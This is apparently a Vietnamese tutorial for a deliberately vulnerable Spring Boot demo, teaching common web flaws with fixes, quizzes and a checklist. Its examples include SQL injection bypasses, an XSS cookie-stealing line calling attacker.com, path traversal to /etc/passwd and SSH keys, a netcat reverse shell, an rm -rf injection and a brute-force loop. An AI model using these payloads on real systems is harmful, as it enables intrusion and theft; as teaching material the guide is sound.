# Hướng Dẫn Sử Dụng Demo - Security Standards

## 📌 Giới Thiệu Nhanh

Đây là demo về **code không an toàn** - minh họa các lỗi bảo mật phổ biến để học tập.

⚠️ **CHỈ DÙNG ĐỂ HỌC TẬP - KHÔNG DÙNG TRONG PRODUCTION!**

---

## 🎯 Bạn Sẽ Học Được Gì?

1. **Nhận biết 10+ lỗi bảo mật phổ biến nhất**
2. **Hiểu cách attacker khai thác vulnerabilities**
3. **Biết cách fix các lỗi này**
4. **Áp dụng secure coding standards**

---

## 🚀 Bắt Đầu Nhanh

### Bước 1: Chạy Application

```bash
cd security-standards-demo
mvn spring-boot:run
```

Application sẽ start tại: http://localhost:8080

### Bước 2: Test Vulnerabilities

Mở terminal khác và thử các lệnh sau:

---

## 💉 Demo 1: SQL INJECTION

### Tấn công 1: Bypass Login

```bash
# Login bình thường (FAIL)
curl "http://localhost:8080/api/insecure/login?username=admin&password=wrong"

# SQL Injection - Bypass authentication (SUCCESS!)
curl "http://localhost:8080/api/insecure/login?username=admin'--&password=anything"
```

**Giải thích:**
- `admin'--` sẽ comment out phần check password
- SQL query trở thành: `SELECT * FROM users WHERE username='admin'--' AND password='...'`
- Phần password check bị ignore!

### Tấn công 2: Lấy Tất Cả Dữ Liệu

```bash
# Search bình thường
curl "http://localhost:8080/api/insecure/search?name=admin"

# SQL Injection - lấy ALL users
curl "http://localhost:8080/api/insecure/search?name=' OR '1'='1"
```

**Giải thích:**
- `' OR '1'='1` luôn đúng (always true)
- SQL query: `SELECT * FROM users WHERE name LIKE '%' OR '1'='1%'`
- Return tất cả users!

### Cách Fix:

```java
// ❌ SAI - String concatenation
String sql = "SELECT * FROM users WHERE name='" + name + "'";

// ✅ ĐÚNG - Prepared Statement
String sql = "SELECT * FROM users WHERE name=?";
PreparedStatement pstmt = conn.prepareStatement(sql);
pstmt.setString(1, name);
```

---

## 🔓 Demo 2: XSS (Cross-Site Scripting)

### Tấn công: Inject JavaScript

```bash
# XSS attack
curl "http://localhost:8080/api/insecure/hello?name=<script>alert('Hacked!')</script>"

# HTML Injection
curl "http://localhost:8080/api/insecure/hello?name=<h1>I%20am%20hacker</h1>"
```

**Xem trong browser:**
Mở: http://localhost:8080/api/insecure/hello?name=<script>alert('XSS')</script>

**Hậu quả:**
- Steal cookies: `<script>fetch('http://attacker.com?cookie='+document.cookie)</script>`
- Redirect users: `<script>window.location='http://evil.com'</script>`
- Keylogging và credential theft

### Cách Fix:

```java
// ❌ SAI - Return raw user input
return "<html><body>Hello " + name + "</body></html>";

// ✅ ĐÚNG - Encode output
import org.springframework.web.util.HtmlUtils;
String safeName = HtmlUtils.htmlEscape(name);
return "<html><body>Hello " + safeName + "</body></html>";
```

---

## 📁 Demo 3: PATH TRAVERSAL

### Tấn công: Đọc File Hệ Thống

```bash
# Try to read /etc/passwd (Linux)
curl "http://localhost:8080/api/insecure/file?path=../../etc/passwd"

# Read application.properties (chứa credentials!)
curl "http://localhost:8080/api/insecure/file?path=src/main/resources/application.properties"
```

**Hậu quả:**
- Đọc passwords, API keys từ config files
- Đọc source code
- Đọc SSH keys (`../../.ssh/id_rsa`)

### Cách Fix:

```java
// ❌ SAI - Accept arbitrary paths
String content = new String(Files.readAllBytes(Paths.get(path)));

// ✅ ĐÚNG - Validate path
Path basePath = Paths.get("/safe/directory/");
Path requestedPath = basePath.resolve(filename).normalize();

if (!requestedPath.startsWith(basePath)) {
    throw new SecurityException("Invalid path");
}
```

---

## 💻 Demo 4: COMMAND INJECTION

### Tấn công: Execute System Commands

```bash
# Normal ping
curl "http://localhost:8080/api/insecure/ping?host=google.com"

# Command Injection - execute whoami
curl "http://localhost:8080/api/insecure/ping?host=google.com;whoami"

# List files
curl "http://localhost:8080/api/insecure/ping?host=google.com;ls"
```

**⚠️ CỰC KỲ NGUY HIỂM:**
```bash
# Delete files
curl "http://localhost:8080/api/insecure/ping?host=google.com;rm+-rf+/tmp/test"

# Reverse shell
curl "http://localhost:8080/api/insecure/ping?host=google.com;nc+attacker.com+4444+-e+/bin/bash"
```

### Cách Fix:

```java
// ❌ SAI - Execute với user input
String command = "ping -c 1 " + host;
Runtime.getRuntime().exec(command);

// ✅ ĐÚNG - Validate và use array
if (!host.matches("^[a-zA-Z0-9.-]+$")) {
    throw new IllegalArgumentException("Invalid host");
}
ProcessBuilder pb = new ProcessBuilder("ping", "-c", "1", host);
```

---

## 🔑 Demo 5: BROKEN AUTHENTICATION

### Vấn đề 1: Plaintext Passwords

```bash
# Register với plaintext password
curl -X POST http://localhost:8080/api/insecure/auth/register-plaintext \
  -H "Content-Type: application/json" \
  -d '{"username":"test","password":"mypassword","email":"test@test.com"}'

# Password được lưu trực tiếp trong database!
# Xem H2 console: http://localhost:8080/h2-console
# JDBC URL: jdbc:h2:mem:testdb
# Username: admin
# Password: admin123
```

### Vấn đề 2: No Rate Limiting - Brute Force

```bash
# Brute force attack (no limit!)
for i in {1..100}; do
  echo "Trying password: pass$i"
  curl -X POST http://localhost:8080/api/insecure/auth/login \
    -H "Content-Type: application/json" \
    -d "{\"username\":\"admin\",\"password\":\"pass$i\"}" \
    2>/dev/null | grep -q "success\":true" && echo "FOUND: pass$i" && break
done
```

### Vấn đề 3: No Authorization Check

```bash
# Bất kỳ ai cũng có thể xem ALL users
curl http://localhost:8080/api/insecure/auth/admin/users

# User thường có thể delete admin!
curl -X DELETE "http://localhost:8080/api/insecure/auth/user/admin?sessionId=ANY_SESSION"
```

### Cách Fix:

```java
// ❌ SAI - Plaintext password
user.setPassword(plainPassword);

// ✅ ĐÚNG - BCrypt hashing
import org.springframework.security.crypto.bcrypt.BCryptPasswordEncoder;
BCryptPasswordEncoder encoder = new BCryptPasswordEncoder(12);
String hashedPassword = encoder.encode(plainPassword);

// ✅ ĐÚNG - Add authorization
@PreAuthorize("hasRole('ADMIN')")
public List<User> getAllUsers() { ... }
```

---

## 🔐 Demo 6: HARDCODED CREDENTIALS

### Tìm Credentials:

```bash
# Get database credentials
curl http://localhost:8080/api/insecure/data/db-config

# Get ALL API keys
curl http://localhost:8080/api/insecure/data/api-keys

# Get complete system config
curl http://localhost:8080/api/insecure/data/debug/config
```

**Response sẽ chứa:**
- Database passwords
- AWS Access Keys
- Stripe API Keys
- JWT Secrets
- Encryption Keys

### Xem trong Source Code:

Mở file `SensitiveDataController.java`:

```java
// ❌ Tất cả secrets đều hardcoded!
private static final String DB_PASSWORD = "SuperSecret123!";
private static final String AWS_SECRET_KEY = "wJalrXUtnFEMI/...";
private static final String STRIPE_API_KEY = "sk_live_51234567890...";
```

### Cách Fix:

```java
// ❌ SAI - Hardcoded
private static final String API_KEY = "sk_live_abc123";

// ✅ ĐÚNG - Environment variable
String apiKey = System.getenv("STRIPE_API_KEY");

// ✅ ĐÚNG - Spring properties
@Value("${stripe.api.key}")
private String apiKey;
```

**application.properties:**
```properties
# ❌ SAI
spring.datasource.password=admin123

# ✅ ĐÚNG
spring.datasource.password=${DB_PASSWORD}
```

---

## 📊 Demo 7: SENSITIVE DATA EXPOSURE

### Tấn công: Lấy Sensitive User Data

```bash
# Get user với ALL sensitive data
curl http://localhost:8080/api/insecure/data/user/123
```

**Response chứa:**
```json
{
  "id": "123",
  "name": "John Doe",
  "email": "john@example.com",
  "ssn": "123-45-6789",        ← NGUY HIỂM!
  "creditCard": "4532-1234-...", ← NGUY HIỂM!
  "cvv": "123",                  ← NGUY HIỂM!
  "password": "user_pass_123",   ← CỰC KỲ NGUY HIỂM!
  "salary": 75000
}
```

### Cách Fix:

```java
// ❌ SAI - Return entity trực tiếp
return user;

// ✅ ĐÚNG - Use DTO, chỉ return cần thiết
public class UserDTO {
    private String id;
    private String name;
    private String email;
    // NO password, SSN, credit card!
}

return new UserDTO(user.getId(), user.getName(), user.getEmail());
```

---

## 🧪 Kiểm Tra Hiểu Biết

### Quiz 1: Tìm Lỗi

```java
// Code này có bao nhiêu lỗi bảo mật?
@GetMapping("/user/{id}")
public User getUser(@PathVariable String id) {
    String sql = "SELECT * FROM users WHERE id=" + id;
    Statement stmt = conn.createStatement();
    ResultSet rs = stmt.executeQuery(sql);
    return mapToUser(rs);
}
```

<details>
<summary>Xem Đáp Án</summary>

**3 lỗi nghiêm trọng:**
1. ❌ SQL Injection (concatenate user input)
2. ❌ No authorization check (anyone can view any user)
3. ❌ Return full User entity (có thể chứa sensitive data)

**Fix:**
```java
@GetMapping("/user/{id}")
@PreAuthorize("hasPermission(#id, 'User', 'READ')")
public UserDTO getUser(@PathVariable String id, Authentication auth) {
    // Check if user can access this data
    if (!id.equals(auth.getUserId()) && !auth.hasRole("ADMIN")) {
        throw new AccessDeniedException("Not authorized");
    }

    // Use prepared statement
    String sql = "SELECT * FROM users WHERE id=?";
    PreparedStatement pstmt = conn.prepareStatement(sql);
    pstmt.setString(1, id);

    User user = mapToUser(pstmt.executeQuery());

    // Return DTO without sensitive data
    return new UserDTO(user.getId(), user.getName(), user.getEmail());
}
```
</details>

---

### Quiz 2: SQL Injection Defense

Cách nào là **ĐÚNG** để prevent SQL Injection?

A. Blacklist các ký tự đặc biệt như `'`, `"`, `;`
B. Sử dụng Prepared Statements
C. Escape user input trước khi concatenate
D. Chỉ accept alphanumeric characters

<details>
<summary>Xem Đáp Án</summary>

**Đáp án: B - Prepared Statements**

**Giải thích:**
- A (Blacklist): ❌ Có thể bypass, không comprehensive
- B (Prepared Statements): ✅ Best practice, parameters được handle riêng biệt
- C (Escape): ⚠️ Có thể help nhưng không reliable 100%
- D (Alphanumeric only): ❌ Too restrictive, không practical

**Code đúng:**
```java
String sql = "SELECT * FROM users WHERE name=?";
PreparedStatement pstmt = conn.prepareStatement(sql);
pstmt.setString(1, userInput);
```
</details>

---

## 📋 Checklist Bảo Mật

Khi review code, kiểm tra:

### Input Validation
- [ ] Validate tất cả user input
- [ ] Check type, format, length, range
- [ ] Use whitelist validation
- [ ] Sanitize và encode output

### SQL & Database
- [ ] Sử dụng Prepared Statements
- [ ] Không concatenate SQL strings
- [ ] Use ORM properly
- [ ] Principle of least privilege cho DB users

### Authentication & Authorization
- [ ] Strong password hashing (BCrypt, Argon2)
- [ ] Rate limiting cho login
- [ ] Secure session management
- [ ] Check authorization ở mọi endpoint
- [ ] Implement RBAC

### Sensitive Data
- [ ] Không hardcode credentials
- [ ] Không log sensitive data
- [ ] Không return passwords trong API
- [ ] Use HTTPS
- [ ] Encrypt data at rest

### Error Handling
- [ ] Generic error messages
- [ ] Không expose stack traces
- [ ] Log errors securely

### Dependencies
- [ ] Keep libraries updated
- [ ] Scan for vulnerabilities
- [ ] Use dependency check tools

---

## 🎓 Bài Tập Thực Hành

### Bài 1: Fix SQL Injection
Sửa method `searchUsers()` trong `SqlInjectionController.java` để an toàn.

### Bài 2: Fix XSS
Sửa method `hello()` trong `XssController.java` để prevent XSS.

### Bài 3: Add Authorization
Thêm authorization check vào `getAllUsers()` - chỉ admin mới được access.

### Bài 4: Remove Hardcoded Credentials
Move tất cả credentials từ `SensitiveDataController.java` sang environment variables.

### Bài 5: Implement Rate Limiting
Thêm rate limiting cho login endpoint.

---

## 📚 Học Thêm

### Công Cụ Hữu Ích:
- **OWASP ZAP**: Test vulnerabilities tự động
- **Burp Suite**: Manual testing và analysis
- **SonarQube**: Static code analysis
- **OWASP Dependency Check**: Check vulnerable libraries

### Resources:
- [OWASP Top 10](https://owasp.org/Top10/)
- [OWASP Cheat Sheet Series](https://cheatsheetseries.owasp.org/)
- [PortSwigger Academy](https://portswigger.net/web-security)
- [Web Security Academy](https://portswigger.net/web-security)

---

## ❓ Câu Hỏi Thường Gặp

### Q: Tại sao không nên dùng MD5 để hash password?
**A:** MD5 quá nhanh! Attacker có thể hash hàng tỷ passwords/giây. BCrypt được design để chậm (computationally expensive), khiến brute force attack không practical.

### Q: Prepared Statements có chặn được tất cả SQL Injection không?
**A:** Chặn được hầu hết! Nhưng vẫn cần cẩn thận với dynamic table/column names. Những trường hợp này cần whitelist validation.

### Q: HTTPS có đủ để bảo vệ passwords không?
**A:** HTTPS chỉ bảo vệ khi transmit (in transit). Passwords vẫn phải hash properly trước khi lưu database (at rest).

### Q: Tôi có thể dùng code này để học penetration testing không?
**A:** Có! Đây chính là mục đích. Nhưng chỉ test trên local machine hoặc môi trường được phép. KHÔNG test trên production systems.

---

## 🎯 Tóm Tắt

**10 Điều Quan Trọng Nhất:**

1. ✅ **Luôn validate user input**
2. ✅ **Sử dụng Prepared Statements**
3. ✅ **Hash passwords với BCrypt**
4. ✅ **Không hardcode credentials**
5. ✅ **Check authorization ở mọi endpoint**
6. ✅ **Encode output để prevent XSS**
7. ✅ **Không log sensitive data**
8. ✅ **Use secure session management**
9. ✅ **Keep dependencies updated**
10. ✅ **Follow principle of least privilege**

---

**Chúc bạn học tốt! 🎓🔒**

*Remember: Security is not a feature, it's a requirement!*
